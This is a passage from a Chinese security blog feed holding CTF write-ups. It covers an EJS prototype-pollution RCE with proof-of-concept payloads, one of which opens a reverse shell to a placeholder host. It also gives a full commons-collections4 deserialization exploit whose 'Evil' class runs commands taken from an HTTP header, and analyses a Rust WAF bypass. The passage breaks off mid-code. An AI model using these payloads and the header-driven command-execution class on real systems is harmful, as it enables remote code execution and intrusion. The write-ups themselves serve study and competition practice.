端口，成功弹出计算器：</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101092925194.png" alt="image-20221101092925194"></p><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>下面开始分析</p><p>在res.render处下断点，第11行是要在reander之前原型链污染添加一个<code>outputFunctionName</code>属性</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101085951539.png" alt="image-20221101085951539"></p><p>跟进res.render函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101090129060.png" alt="image-20221101090129060"></p><p>进入到response.js，到1039行的app.render函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101090244446.png" alt="image-20221101090244446"></p><p>跟进到application.js，到render函数，函数的最后一行<code>tryRender</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101090418983.png" alt="image-20221101090418983"></p><p>到同文件application.js中的tryRender函数，调用了<code>view.render(options, callback);</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101090603783.png" alt="image-20221101090603783"></p><p>跟进render函数，到view.js的render函数，这里调用this.engine。</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101090846528.png" alt="image-20221101090846528"></p><p>跟进<code>this.engine(this.path, options, callback);</code>，从这里进入到了模板渲染引擎 <code>ejs.js</code> 中</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101091025643.png" alt="image-20221101091025643"></p><p>跟进<code>tryHandleCache</code>，调用<code>handleCache</code>方法，传data参数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101091119990.png" alt="image-20221101091119990"></p><p>跟进handleCache，调用渲染模板的compile方法</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101091312317.png" alt="image-20221101091312317"></p><p>跟进compile方法，调用<code>templ.compile()</code>，这个函数存在大量的渲染拼接，其中会判断opts.outputFunctionName是否存在，这也是我们为什么要污染outputFunctionName属性的缘故，判断成功会将outputFunctionName拼接到prepended中。</p><p>而prepended 在最后会被传递给 this.source 并被带入函数执行</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221101091534571.png" alt="image-20221101091534571"></p><p>常用的ejs模板引擎RCE的POC</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://www.anquanke.com/post/id/248170#h2-8">从 Lodash 原型链污染到模板 RCE-安全客 - 安全资讯平台 (anquanke.com)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> nodejs安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> 原型链污染 </tag>
            
            <tag> ejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022祥云杯初赛</title>
      <link href="/2022/10/31/2022%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
      <url>/2022/10/31/2022%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2022祥云杯初赛"><a href="#2022祥云杯初赛" class="headerlink" title="2022祥云杯初赛"></a>2022祥云杯初赛</h1><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><p>直接查看依赖，含有commons-collections4依赖</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1667218721677-2.png" alt="img"></p><p>cc2</p><p>不出网的恶意类构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网上找个cc2的链子，简单修改下，exp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造恶意类TestTemplatesImpl并转换为字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;cc2.Evil&quot;</span>);</span><br><span class="line"><span class="comment">//        CtClass ctClass = classPool.getCtClass(&quot;cc2.Evil&quot;);</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射创建TemplatesImpl</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">TemplatesImpl_instance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line">        <span class="comment">//将恶意类的字节码设置给_bytecodes属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="comment">//设置属性_name为恶意类名</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(TemplatesImpl_instance, <span class="string">&quot;TestTemplatesImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformer_comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置comparator属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(queue, transformer_comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置queue属性</span></span><br><span class="line">        field = queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//队列至少需要2个元素</span></span><br><span class="line">        Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance, TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue, objects);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化 ---&gt; 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] aaa = serialize(queue);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(aaa));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改CT，header添加<code>cmd: cat /flag</code>，获得flag</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1667218721650-1.png" alt="img"></p><h2 id="RustWaf"><a href="#RustWaf" class="headerlink" title="RustWaf"></a>RustWaf</h2><p>比赛没做出来，赛后复现下</p><p>主要功能在&#x2F;readfile路由，会将post的信息作为参数body调用rust程序</p><p>在本地运行，进行了一点修改，主要逻辑不变</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::env;</span><br><span class="line"><span class="keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;</span><br><span class="line"><span class="keyword">use</span> serde_json::Value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> BLACK_PROPERTY: &amp;<span class="type">str</span> = <span class="string">&quot;protocol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Serialize, Deserialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">File</span>&#123;</span><br><span class="line">    <span class="meta">#[serde(default = <span class="string">&quot;default_protocol&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> protocol: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> href: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> origin: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> pathname: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> hostname:<span class="type">String</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">default_protocol</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>.<span class="title function_ invoke__">to_string</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//protocol is default value,can&#x27;t be customized</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">waf</span>(body: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> body.<span class="title function_ invoke__">to_lowercase</span>().<span class="title function_ invoke__">contains</span>(<span class="string">&quot;flag&quot;</span>) ||  body.<span class="title function_ invoke__">to_lowercase</span>().<span class="title function_ invoke__">contains</span>(<span class="string">&quot;proc&quot;</span>)&#123;   <span class="comment">//转小写，进行字符串匹配</span></span><br><span class="line">        <span class="keyword">return</span> String::<span class="title function_ invoke__">from</span>(<span class="string">&quot;1111111111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(json_body) = serde_json::from_str::&lt;Value&gt;(body) &#123;    <span class="comment">// 将字符串转换为json对象</span></span><br><span class="line">        <span class="comment">// println!(&quot;转换json对象成功&quot;);</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(json_body_obj) = json_body.<span class="title function_ invoke__">as_object</span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> json_body_obj.<span class="title function_ invoke__">keys</span>().<span class="title function_ invoke__">any</span>(|key| key == BLACK_PROPERTY) &#123;      <span class="comment">// 这里判断如果存在protocol属性，就直接return </span></span><br><span class="line">                <span class="keyword">return</span> String::<span class="title function_ invoke__">from</span>(<span class="string">&quot;22222222222222&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//not contains protocol,check if struct is File</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(file) = serde_json::from_str::&lt;File&gt;(body) &#123;  <span class="comment">//反序列化时，如果protocol没有赋值，就会去default_protocol函数进行赋值为http</span></span><br><span class="line">            <span class="comment">// print!(&quot;是struct结构&quot;);</span></span><br><span class="line">            <span class="keyword">return</span> serde_json::<span class="title function_ invoke__">to_string</span>(&amp;file).<span class="title function_ invoke__">unwrap_or</span>(String::<span class="title function_ invoke__">from</span>(<span class="string">&quot;3333333333333&quot;</span>));  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//body not json</span></span><br><span class="line">        <span class="comment">// println!(&quot;body not json&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> String::<span class="title function_ invoke__">from</span>(body);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> String::<span class="title function_ invoke__">from</span>(<span class="string">&quot;444444444444444&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">args</span>: <span class="type">Vec</span>&lt;<span class="type">String</span>&gt; = env::<span class="title function_ invoke__">args</span>().<span class="title function_ invoke__">collect</span>();</span><br><span class="line">    <span class="comment">// let args: &amp;str = &quot;&#123;\&quot;href\&quot;:\&quot;127.0.0.1\&quot;,\&quot;origin\&quot;:\&quot;127.0.0.1\&quot;,\&quot;pathname\&quot;:\&quot;/js/test.js\&quot;,\&quot;hostname\&quot;:\&quot;127.0.0.1\&quot;&#125;&quot;;</span></span><br><span class="line">    <span class="comment">// let args: &amp;str = &quot;&#123;\&quot;protocol\&quot;:\&quot;file\&quot;,\&quot;href\&quot;:\&quot;127.0.0.1\&quot;,\&quot;origin\&quot;:\&quot;127.0.0.1\&quot;,\&quot;pathname\&quot;:\&quot;/js/test.js\&quot;,\&quot;hostname\&quot;:\&quot;127.0.0.1\&quot;&#125;&quot;;</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="title function_ invoke__">waf</span>(&amp;args[<span class="number">1</span>]));</span><br><span class="line">    <span class="comment">// println!(&quot;&#123;&#125;&quot;, waf(args));</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先将将参数传入waf函数</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221031113011754.png" alt="image-20221031113011754"></p><p>首先将字符串转小写，判断是否含有<code>flag</code>和<code>proc</code>字符串</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221031113131332.png" alt="image-20221031113131332"></p><p>而后尝试转换为json对象，对键值判断是否含有<code>BLACK_PROPERTY</code>（也就是protocol）</p><p>然后将其作为struct对象反序列化，将其返回，经过调试，返回的字符串大致为<code>&#123;&quot;protocol&quot;:&quot;file:&quot;,&quot;href&quot;:&quot;1&quot;,&quot;origin&quot;:&quot;1&quot;,&quot;pathname&quot;:&quot;/D:\\projects\\fl%61g.txt&quot;,&quot;hostname&quot;:&quot;&quot;&#125;</code>这个样子</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221031113617982.png" alt="image-20221031113617982"></p><p>而后js程序将其返回的字符串尝试转化为json数据，而后使用readFileSync读取</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221031114132763.png" alt="image-20221031114132763"></p><p>我们看<code>fs.readFileSync</code>的函数定义，其参数是可以整一个URL类对象的</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221031152632401.png" alt="image-20221031152632401"></p><p>我们会发现URL类的属性和题目给的File结构体极其相似</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221031152859412.png" alt="image-20221031152859412"></p><p>所以之前通过<code>let Ok(file) = serde_json::from_str::&lt;File&gt;(body)</code>来反序列化，得到</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span><span class="string">&quot;file:&quot;</span><span class="punctuation">,</span><span class="attr">&quot;href&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;origin&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pathname&quot;</span><span class="punctuation">:</span><span class="string">&quot;/D:\\projects\\fl%61g.txt&quot;</span><span class="punctuation">,</span><span class="attr">&quot;hostname&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221031153038535.png" alt="image-20221031153038535"></p><p>但是要过两个waf，一个是对flag和proc字符串的过滤，另一个对键的过滤，不能包括BLACK_PROPERTY<code>(也就是protocol)</code></p><p>前者可以通过url编码绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 